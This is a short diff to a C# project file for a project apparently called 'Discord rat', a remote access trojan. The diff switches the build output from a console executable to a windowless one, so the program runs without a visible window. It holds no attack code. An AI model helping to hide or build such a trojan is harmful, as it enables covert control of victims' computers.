@@ -5,7 +5,7 @@
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{CC12258F-AF24-4773-A8E3-45D365BCBDE9}</ProjectGuid>
-    <OutputType>Exe</OutputType>
+    <OutputType>WinExe</OutputType>
     <RootNamespace>Discord_rat</RootNamespace>
     <AssemblyName>Discord rat</AssemblyName>
     <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
